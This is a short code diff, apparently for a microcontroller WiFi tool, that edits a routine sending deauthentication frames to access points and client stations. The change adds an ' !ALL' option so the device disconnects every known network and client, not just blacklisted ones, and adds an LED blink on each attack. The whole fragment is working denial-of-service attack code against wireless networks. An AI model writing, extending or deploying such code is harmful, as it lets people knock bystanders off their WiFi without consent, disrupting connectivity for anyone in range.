@@ -27,19 +27,20 @@ void madWifi_worker()
                     sprintf(ap,"%02X%02X%02X%02X%02X%02X",aps_known[ua].bssid[0],aps_known[ua].bssid[1],aps_known[ua].bssid[2],aps_known[ua].bssid[3],aps_known[ua].bssid[4],aps_known[ua].bssid[5]);
 
 
-                    if(Blacklist.indexOf(" " + String(ap)) >= 0)
+                    if(Blacklist.indexOf(" " + String(ap)) >= 0 || Blacklist.indexOf(" !ALL") >= 0)
                     {
                         Serial.printf("AP Deauth: %s ( %s )\n",ap,aps_known[ua].ssid);
-                        //print_client(clients_known[uc]);
                         deauth(broadcast2, aps_known[ua].bssid, 128);
                         deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
+                        //make_beacon("",(char*)aps_known[ua].ssid,channel);
+                        led1_blink(50);
                     }
-                    else if(Blacklist.indexOf(" " + String(station)) >= 0)
+                    else if(Blacklist.indexOf(" " + String(station)) >= 0 || Blacklist.indexOf(" !ALL") >= 0)
                     {
-                        //Serial.printf("Station Deauth: %s <> %s\n",station,ap);
                         Serial.printf("Station Deauth: %s -> %s\n",station,aps_known[ua].ssid);
-                        //print_client(clients_known[uc]);
                         deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
+                        //make_beacon("",(char*)aps_known[ua].ssid,channel);
+                        led1_blink(50);
                     }
 
                     //Serial.printf("Skip: %s <> %s\n",station,ap);
